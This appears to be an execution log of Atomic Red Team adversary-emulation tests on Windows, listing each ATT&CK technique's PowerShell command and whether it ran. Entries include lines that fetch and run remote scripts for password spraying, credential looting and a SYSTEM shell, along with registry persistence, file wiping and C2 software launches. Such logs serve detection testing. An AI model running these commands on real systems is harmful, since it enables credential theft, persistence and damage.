adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__7532005da662bfc703ce3d8ef4e8ac70__trial_1

atomic_ordering: ['7532005da662bfc703ce3d8ef4e8ac70']
------------------------------
{'ability_id': '7532005da662bfc703ce3d8ef4e8ac70',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.003',
            'technique_name': 'Brute Force: Password Spraying'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'domainpassspray -consoleoutput -noninteractive -emptypasswords',
 'delegated': '2023-11-29T21:19:46Z',
 'description': 'DomainPasswordSpray Attacks technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '6245166c-b9bb-4bd5-91ea-414ef98a2e7f',
 'name': 'WinPwn - DomainPasswordSpray Attacks',
 'pid': 10148,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'domainpassspray -consoleoutput -noninteractive '
                      '-emptypasswords',
 'platform': 'windows',
 'run': '2023-11-29T21:20:12Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__42102f01777d40a7db982282c4c791e9__trial_1

atomic_ordering: ['42102f01777d40a7db982282c4c791e9']
------------------------------
{'ability_id': '42102f01777d40a7db982282c4c791e9',
 'agent_reported_time': '2023-11-11T13:10:32Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties "
            'useraccountcontrol | Format-Table name',
 'delegated': '2023-11-28T13:45:33Z',
 'description': 'When successful, accounts that do not require kerberos '
                'pre-auth will be returned.\n'
                'Reference: '
                'https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n',
 'executor': 'psh',
 'link_id': '5b5ce18e-d436-4256-be24-ca2576afc816',
 'name': 'Get-ADUser Enumeration using UserAccountControl flags (AS-REP '
         'Roasting)',
 'pid': 9648,
 'plaintext_command': "Get-ADUser -Filter 'useraccountcontrol -band 4194304' "
                      '-Properties useraccountcontrol | Format-Table name',
 'platform': 'windows',
 'run': '2023-11-28T13:46:27Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__f7c881e0d021a2f5b45546b5d0b4998e__trial_1

atomic_ordering: ['f7c881e0d021a2f5b45546b5d0b4998e']
------------------------------
{'ability_id': 'f7c881e0d021a2f5b45546b5d0b4998e',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.004',
            'technique_name': 'Boot or Logon Autostart Execution: Winlogon '
                              'Helper DLL'},
 'command': 'New-Item "HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" -Force; '
            'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" "DllName" '
            '"C:\\Windows\\Temp\\atomicNotificationPackage.dll" -Type '
            'ExpandString -Force; Set-ItemProperty '
            '"HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" "Logon" '
            '"AtomicTestFunction" -Force; Set-ItemProperty '
            '"HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
            '"Impersonate" 1 -Type DWord -Force; Set-ItemProperty '
            '"HKCU:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
            '"Asynchronous" 0 -Type DWord -Force',
 'delegated': '2023-12-02T06:20:54Z',
 'description': 'PowerShell code to set Winlogon Notify key to execute a '
                'notification package DLL at logon.\n'
                '\n'
                'Upon successful execution, PowerShell will modify a registry '
                'value to execute atomicNotificationPackage.dll upon logon.\n'
                '\n'
                'Please note that Winlogon Notifications have been removed as '
                'of Windows Vista / Windows Server 2008 and that this test '
                'thus only applies to erlier versions of Windows.\n',
 'executor': 'psh',
 'link_id': 'dbedbbd2-4dc8-49f1-8878-aad035f95901',
 'name': 'Winlogon Notify Key Logon Persistence - PowerShell',
 'pid': 10196,
 'plaintext_command': 'New-Item "HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
                      '-Force; Set-ItemProperty '
                      '"HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
                      '"DllName" '
                      '"C:\\Windows\\Temp\\atomicNotificationPackage.dll" '
                      '-Type ExpandString -Force; Set-ItemProperty '
                      '"HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
                      '"Logon" "AtomicTestFunction" -Force; Set-ItemProperty '
                      '"HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
                      '"Impersonate" 1 -Type DWord -Force; Set-ItemProperty '
                      '"HKCU:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam" '
                      '"Asynchronous" 0 -Type DWord -Force',
 'platform': 'windows',
 'run': '2023-12-02T06:21:24Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__6646e3ecc1d5a25bc1cd7e68fe43763b__trial_1

atomic_ordering: ['6646e3ecc1d5a25bc1cd7e68fe43763b']
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__e0e717c540d5e8ff24f00b7434626f7e__trial_1

atomic_ordering: ['e0e717c540d5e8ff24f00b7434626f7e']
------------------------------
{'ability_id': 'e0e717c540d5e8ff24f00b7434626f7e',
 'agent_reported_time': '2023-11-11T13:10:03Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Start-Process '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe"',
 'delegated': '2023-12-01T06:50:15Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'RemotePC Software for use as a C2 channel. \n'
                'Upon successful execution, RemotePC will be executed. \n',
 'executor': 'psh',
 'link_id': '8226d6f8-60bd-4b31-af14-66da32ed73e5',
 'name': 'RemotePC Software Execution',
 'pid': 10992,
 'plaintext_command': 'Start-Process '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\RemotePC.exe"',
 'platform': 'windows',
 'run': '2023-12-01T06:50:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218__defense-evasion__signed_binary_proxy_execution__e6190b6456bdab5e159fabbfe1fcf251__trial_1

atomic_ordering: ['e6190b6456bdab5e159fabbfe1fcf251']
==============================
==============================
adversary_id: atomic__t1485__impact__data_destruction__b74b60096fb49650e27e470047a2b9c9__trial_1

atomic_ordering: ['b74b60096fb49650e27e470047a2b9c9']
------------------------------
{'ability_id': 'b74b60096fb49650e27e470047a2b9c9',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'impact',
            'technique_id': 'T1485',
            'technique_name': 'Data Destruction'},
 'command': 'if (-not (Test-Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt")) { '
            'New-Item "PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt" '
            '-Force }; & '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe" '
            '-accepteula '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt"',
 'delegated': '2023-12-01T09:25:59Z',
 'description': 'Overwrites and deletes a file using SysInternals SDelete. '
                'Upon successful execution, "Files deleted: 1" will be '
                'displayed in\n'
                'the powershell session along with other information about the '
                'file that was deleted.\n',
 'executor': 'psh',
 'link_id': 'a5766c7e-d890-4354-9de9-21dc021d454d',
 'name': 'Windows - Overwrite file with SysInternals SDelete',
 'pid': 10176,
 'plaintext_command': 'if (-not (Test-Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt")) '
                      '{ New-Item '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt" '
                      '-Force }; & '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe" '
                      '-accepteula '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt"',
 'platform': 'windows',
 'run': '2023-12-01T09:26:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__5a33c31395b6ef3ee38097b327c8b79d__trial_1

atomic_ordering: ['5a33c31395b6ef3ee38097b327c8b79d']
------------------------------
{'ability_id': '5a33c31395b6ef3ee38097b327c8b79d',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': '([adsisearcher]"objectcategory=user").FindAll(); '
            '([adsisearcher]"objectcategory=user").FindOne()',
 'delegated': '2023-11-29T07:11:38Z',
 'description': 'The following Atomic test will utilize ADSISearcher to '
                'enumerate users within Active Directory.\n'
                'Upon successful execution a listing of users will output with '
                'their paths in AD.\n'
                'Reference: '
                'https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n',
 'executor': 'psh',
 'link_id': '693218af-0716-4adf-a7c3-9e277c2ac118',
 'name': 'Enumerate Active Directory Users with ADSISearcher',
 'pid': 5528,
 'plaintext_command': '([adsisearcher]"objectcategory=user").FindAll(); '
                      '([adsisearcher]"objectcategory=user").FindOne()',
 'platform': 'windows',
 'run': '2023-11-29T07:11:59Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__baf7e695c46eda5497fc648d976054a6__trial_1

atomic_ordering: ['baf7e695c46eda5497fc648d976054a6']
==============================
==============================
adversary_id: atomic__t1562_008__defense-evasion__impair_defenses-_disable_cloud_logs__100ab97404481eade26a4346edd80d73__trial_1

atomic_ordering: ['100ab97404481eade26a4346edd80d73']
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__4712f45e41760276d20885bbc885a2ef__trial_1

atomic_ordering: ['4712f45e41760276d20885bbc885a2ef']
------------------------------
{'ability_id': '4712f45e41760276d20885bbc885a2ef',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': 'net user /domain; get-localgroupmember -group Users; get-aduser '
            '-filter *',
 'delegated': '2023-11-29T06:32:40Z',
 'description': 'Enumerate all accounts via PowerShell. Upon execution, lots '
                'of user account and group information will be displayed.\n',
 'executor': 'psh',
 'link_id': '0fcd0536-9022-43da-b67b-dd1c836a20b0',
 'name': 'Enumerate all accounts via PowerShell (Domain)',
 'pid': 3240,
 'plaintext_command': 'net user /domain; get-localgroupmember -group Users; '
                      'get-aduser -filter *',
 'platform': 'windows',
 'run': '2023-11-29T06:32:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1033__discovery__system_owner,user_discovery__221d4ebcb41e708b6ee90c1c0369a969__trial_1

atomic_ordering: ['221d4ebcb41e708b6ee90c1c0369a969']
------------------------------
{'ability_id': '221d4ebcb41e708b6ee90c1c0369a969',
 'agent_reported_time': '2023-11-11T13:09:25Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1033',
            'technique_name': 'System Owner/User Discovery'},
 'command': '[System.Security.Principal.WindowsIdentity]::GetCurrent() | '
            'Out-File -FilePath .\\CurrentUserObject.txt',
 'delegated': '2023-11-27T13:51:51Z',
 'description': 'Use the PowerShell "GetCurrent" method of the WindowsIdentity '
                '.NET class to identify the logged user.',
 'executor': 'psh',
 'link_id': '57ec76e7-39cd-4131-a49c-134f414c4e32',
 'name': 'GetCurrent User with PowerShell Script',
 'pid': 9640,
 'plaintext_command': '[System.Security.Principal.WindowsIdentity]::GetCurrent() '
                      '| Out-File -FilePath .\\CurrentUserObject.txt',
 'platform': 'windows',
 'run': '2023-11-27T13:52:05Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1021_002__lateral-movement__remote_services-_smb,windows_admin_shares__31a7326fcc56c71d97da23e3fe1ec364__trial_1

atomic_ordering: ['31a7326fcc56c71d97da23e3fe1ec364']
------------------------------
{'ability_id': '31a7326fcc56c71d97da23e3fe1ec364',
 'agent_reported_time': '2023-11-11T13:09:02Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1021.002',
            'technique_name': 'Remote Services: SMB/Windows Admin Shares'},
 'command': 'New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$',
 'delegated': '2023-11-27T09:40:50Z',
 'description': 'Map Admin share utilizing PowerShell\n',
 'executor': 'psh',
 'link_id': 'c9bdae7b-1c8a-46aa-8492-b722ca720a44',
 'name': 'Map Admin Share PowerShell',
 'pid': 5428,
 'plaintext_command': 'New-PSDrive -name g -psprovider filesystem -root '
                      '\\\\Target\\C$',
 'platform': 'windows',
 'run': '2023-11-27T09:41:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_004__multiple__boot_or_logon_autostart_execution-_winlogon_helper_dll__dc74af5b90b9cbb4dcfbcaaa3e412a5e__trial_1

atomic_ordering: ['dc74af5b90b9cbb4dcfbcaaa3e412a5e']
------------------------------
{'ability_id': 'dc74af5b90b9cbb4dcfbcaaa3e412a5e',
 'agent_reported_time': '2023-11-11T13:10:42Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.004',
            'technique_name': 'Boot or Logon Autostart Execution: Winlogon '
                              'Helper DLL'},
 'command': 'Set-ItemProperty "HKLM:\\Software\\Microsoft\\Windows '
            'NT\\CurrentVersion\\Winlogon\\" "Shell" "explorer.exe, '
            'C:\\Windows\\System32\\cmd.exe" -Force',
 'delegated': '2023-12-02T06:01:38Z',
 'description': 'PowerShell code to set Winlogon shell key to execute a binary '
                'at logon along with explorer.exe.\n'
                '\n'
                'Upon successful execution, PowerShell will modify a registry '
                'value to execute cmd.exe upon logon/logoff.\n',
 'executor': 'psh',
 'link_id': '3b9dd1c5-8cae-44cd-8364-3f7f7a079da8',
 'name': 'Winlogon HKLM Shell Key Persistence - PowerShell',
 'pid': 8936,
 'plaintext_command': 'Set-ItemProperty "HKLM:\\Software\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\Winlogon\\" "Shell" "explorer.exe, '
                      'C:\\Windows\\System32\\cmd.exe" -Force',
 'platform': 'windows',
 'run': '2023-12-02T06:02:21Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__9e1358e1b78af4bf86bab2334485a015__trial_1

atomic_ordering: ['9e1358e1b78af4bf86bab2334485a015']
------------------------------
{'ability_id': '9e1358e1b78af4bf86bab2334485a015',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Start-Process '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe"',
 'delegated': '2023-12-01T05:32:15Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'Ammyy Admin Remote Desktop Software for use as a C2 '
                'channel. \n'
                'Upon successful execution, Ammyy Admin will be executed. \n',
 'executor': 'psh',
 'link_id': '47caad23-d727-47af-862c-869ef55eeee0',
 'name': 'Ammyy Admin Software Execution',
 'pid': 10992,
 'plaintext_command': 'Start-Process '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\ammyy.exe"',
 'platform': 'windows',
 'run': '2023-12-01T05:32:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__b45cb08e24877077d98421393bce079a__trial_1

atomic_ordering: ['b45cb08e24877077d98421393bce079a']
------------------------------
{'ability_id': 'b45cb08e24877077d98421393bce079a',
 'agent_reported_time': '2023-11-11T13:09:43Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': '([adsisearcher]"objectcategory=group").FindAll(); '
            '([adsisearcher]"objectcategory=group").FindOne()',
 'delegated': '2023-11-28T14:43:26Z',
 'description': 'The following Atomic test will utilize ADSISearcher to '
                'enumerate groups within Active Directory.\n'
                'Upon successful execution a listing of groups will output '
                'with their paths in AD.\n'
                'Reference: '
                'https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n',
 'executor': 'psh',
 'link_id': 'b52a6eb0-33d8-47b1-9817-cdd5817f84f5',
 'name': 'Enumerate Active Directory Groups with ADSISearcher',
 'pid': 5416,
 'plaintext_command': '([adsisearcher]"objectcategory=group").FindAll(); '
                      '([adsisearcher]"objectcategory=group").FindOne()',
 'platform': 'windows',
 'run': '2023-11-28T14:43:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__80d22fb154cc39b34d920f0855ce746e__trial_1

atomic_ordering: ['80d22fb154cc39b34d920f0855ce746e']
==============================
==============================
adversary_id: atomic__t1078_003__multiple__valid_accounts-_local_accounts__5ce7136a4547b0bf3ca074c94fb10b24__trial_1

atomic_ordering: ['5ce7136a4547b0bf3ca074c94fb10b24']
------------------------------
{'ability_id': '5ce7136a4547b0bf3ca074c94fb10b24',
 'agent_reported_time': '2023-11-11T13:09:44Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1078.003',
            'technique_name': 'Valid Accounts: Local Accounts'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'obfuskittiedump -consoleoutput -noninteractive',
 'delegated': '2023-11-28T23:24:59Z',
 'description': 'Loot local Credentials - powerhell kittie technique via '
                'function of WinPwn',
 'executor': 'psh',
 'link_id': 'da1c7b74-cedb-4501-b457-83b84fe59e01',
 'name': 'WinPwn - Loot local Credentials - powerhell kittie',
 'pid': 7056,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'obfuskittiedump -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-11-28T23:25:56Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1531__impact__account_access_removal__3f71c3360964b1a8c81618eb963c05f9__trial_1

atomic_ordering: ['3f71c3360964b1a8c81618eb963c05f9']
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__413fc5fa7ac34f8a42183217d7f3ec90__trial_1

atomic_ordering: ['413fc5fa7ac34f8a42183217d7f3ec90']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098_003__persistence__account_manipulation-_additional_cloud_roles__64c11bc729e5b99c282d4abd4d51b3fc__trial_1

atomic_ordering: ['64c11bc729e5b99c282d4abd4d51b3fc']
==============================
==============================
adversary_id: atomic__t1047__execution__windows_management_instrumentation__80cda763aa992b775038ce134c892070__trial_1

atomic_ordering: ['80cda763aa992b775038ce134c892070']
------------------------------
{'ability_id': '80cda763aa992b775038ce134c892070',
 'agent_reported_time': '2023-11-11T13:09:59Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1047',
            'technique_name': 'Windows Management Instrumentation'},
 'command': '$Class = New-Object Management.ManagementClass(New-Object '
            'Management.ManagementPath("Win32_Process")); $NewClass = '
            '$Class.Derive("Win32_Atomic"); $NewClass.Put(); Invoke-WmiMethod '
            '-Path Win32_Atomic -Name create -ArgumentList notepad.exe',
 'delegated': '2023-11-27T19:44:29Z',
 'description': 'This test tries to mask process creation by creating a new '
                'class that inherits from Win32_Process. Indirect call of '
                'suspicious method such as Win32_Process::Create can break '
                'detection logic.\n'
                '[Cybereason blog post No '
                'Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n',
 'executor': 'psh',
 'link_id': 'f7e8f8e8-b3cd-4619-b94d-b92b30d51436',
 'name': 'Create a Process using obfuscated Win32_Process',
 'pid': 4532,
 'plaintext_command': '$Class = New-Object '
                      'Management.ManagementClass(New-Object '
                      'Management.ManagementPath("Win32_Process")); $NewClass '
                      '= $Class.Derive("Win32_Atomic"); $NewClass.Put(); '
                      'Invoke-WmiMethod -Path Win32_Atomic -Name create '
                      '-ArgumentList notepad.exe',
 'platform': 'windows',
 'run': '2023-11-27T19:44:40Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__acf646b22c5d2c2b1058feb7da1f3bdc__trial_1

atomic_ordering: ['acf646b22c5d2c2b1058feb7da1f3bdc']
------------------------------
{'ability_id': 'acf646b22c5d2c2b1058feb7da1f3bdc',
 'agent_reported_time': '2023-11-11T13:09:31Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': 'if (!(Test-Path '
            '"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg")) '
            '{ reg.exe export '
            '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" '
            '"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg" '
            '/y }; Set-ItemProperty -Path '
            '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" '
            '-Name "BootExecute" -Value "autocheck autoche *" -Type '
            'MultiString',
 'delegated': '2023-12-02T03:25:53Z',
 'description': 'This test modifies the BootExecute registry value to '
                '"autocheck autoche *", which can be used to simulate an '
                "adversary's attempt to tamper with the system's boot "
                'process. \n'
                'Reference - '
                'https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\n'
                'NOTE that by not saving the correct value, you may inhibit '
                'your system from booting properly. Only run on a test system. '
                'There is a reg export before running the Atomic.\n',
 'executor': 'psh',
 'link_id': 'c8feb6e2-12da-436b-b59d-b701a5391b9c',
 'name': 'Modify BootExecute Value',
 'pid': 10928,
 'plaintext_command': 'if (!(Test-Path '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg")) '
                      '{ reg.exe export '
                      '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session '
                      'Manager" '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg" '
                      '/y }; Set-ItemProperty -Path '
                      '"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session '
                      'Manager" -Name "BootExecute" -Value "autocheck autoche '
                      '*" -Type MultiString',
 'platform': 'windows',
 'run': '2023-12-02T03:26:26Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1134_002__multiple__create_process_with_token__fdc26580786ac9d3ffc38aea053cbd29__trial_1

atomic_ordering: ['fdc26580786ac9d3ffc38aea053cbd29']
------------------------------
{'ability_id': 'fdc26580786ac9d3ffc38aea053cbd29',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.002',
            'technique_name': 'Create Process with Token'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
 'delegated': '2023-11-30T07:36:22Z',
 'description': 'Get SYSTEM shell - Pop System Shell using Token Manipulation '
                'technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'f96b342b-a968-4da0-bbaa-1ca6aaee1307',
 'name': 'WinPwn - Get SYSTEM shell - Pop System Shell using Token '
         'Manipulation technique',
 'pid': 10068,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
 'platform': 'windows',
 'run': '2023-11-30T07:36:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_002__discovery__permission_groups_discovery-_domain_groups__f071213a29669283eeb8ab07ddffdbfb__trial_1

atomic_ordering: ['f071213a29669283eeb8ab07ddffdbfb']
------------------------------
{'ability_id': 'f071213a29669283eeb8ab07ddffdbfb',
 'agent_reported_time': '2023-11-11T13:10:15Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.002',
            'technique_name': 'Permission Groups Discovery: Domain Groups'},
 'command': 'Get-AdGroup -Filter *',
 'delegated': '2023-11-28T15:02:31Z',
 'description': 'The following Atomic test will utilize Get-AdGroup to '
                'enumerate groups within Active Directory.\n'
                'Upon successful execution a listing of groups will output '
                'with their paths in AD.\n'
                'Reference: '
                'https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n',
 'executor': 'psh',
 'link_id': '4c9efbda-f571-4972-93d1-9c4850b76c6d',
 'name': 'Enumerate Active Directory Groups with Get-AdGroup',
 'pid': 212,
 'plaintext_command': 'Get-AdGroup -Filter *',
 'platform': 'windows',
 'run': '2023-11-28T15:03:32Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1113__collection__screen_capture__64569d9eb87191fc3cbf365a656e31ab__trial_1

atomic_ordering: ['64569d9eb87191fc3cbf365a656e31ab']
------------------------------
{'ability_id': '64569d9eb87191fc3cbf365a656e31ab',
 'agent_reported_time': '2023-11-11T13:09:51Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1113',
            'technique_name': 'Screen Capture'},
 'command': 'Add-Type -AssemblyName System.Windows.Forms; $screen = '
            '[Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = '
            'New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic '
            '= [Drawing.Graphics]::FromImage($bitmap); '
            '$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, '
            '$bitmap.Size); $bitmap.Save("$env:TEMP\\T1113.png")',
 'delegated': '2023-11-30T01:50:39Z',
 'description': 'Take a screen capture of the desktop through a call to the '
                '[Graphics.CopyFromScreen] .NET API.\n'
                '\n'
                '[Graphics.CopyFromScreen]: '
                'https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n',
 'executor': 'psh',
 'link_id': '19f9ef58-7caf-4bc1-bc9f-a2ab64c100fd',
 'name': 'Windows Screen Capture (CopyFromScreen)',
 'pid': 11120,
 'plaintext_command': 'Add-Type -AssemblyName System.Windows.Forms; $screen = '
                      '[Windows.Forms.SystemInformation]::VirtualScreen; '
                      '$bitmap = New-Object Drawing.Bitmap $screen.Width, '
                      '$screen.Height; $graphic = '
                      '[Drawing.Graphics]::FromImage($bitmap); '
                      '$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, '
                      '0, $bitmap.Size); $bitmap.Save("$env:TEMP\\T1113.png")',
 'platform': 'windows',
 'run': '2023-11-30T01:50:49Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__a72efdca009d9d28e444240e691a4769__trial_1

atomic_ordering: ['a72efdca009d9d28e444240e691a4769']
------------------------------
{'ability_id': 'a72efdca009d9d28e444240e691a4769',
 'agent_reported_time': '2023-11-11T13:09:24Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.007',
            'technique_name': 'Signed Binary Proxy Execution: Msiexec'},
 'command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'delegated': '2023-12-01T01:01:18Z',
 'description': 'Executes an MSI containing embedded JScript code using the '
                'WMI Win32_Product class\n',
 'executor': 'psh',
 'link_id': '8ac68bd4-3aca-4365-8d72-ec10496ef631',
 'name': 'WMI Win32_Product Class - Execute Local MSI file with embedded '
         'JScript',
 'pid': 7192,
 'plaintext_command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'platform': 'windows',
 'run': '2023-12-01T01:01:28Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
